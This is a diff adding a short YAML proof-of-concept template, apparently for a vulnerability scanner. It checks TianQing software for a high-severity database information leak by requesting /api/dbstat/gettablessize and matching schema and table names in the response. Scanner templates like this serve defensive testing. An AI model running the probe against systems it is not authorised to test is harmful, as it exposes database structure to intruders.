@@ -1,0 +1,17 @@
+id: poc-yaml-tianqing-database-info-leak
+info:
+  name: 天清软件（TianQing）数据库信息泄漏漏洞
+  severity: high
+  finger: TianQing
+  tags:
+  - 信息泄露
+  osprey-id: vb_2021_0020
+requests:
+- method: GET
+  path: /api/dbstat/gettablessize
+  expression: 'status_code == 200 && contains(body, "schema_name") && contains(body,
+    "table_name") && contains(body, "table_size")
+
+    '
+variables: {}
+transport: http
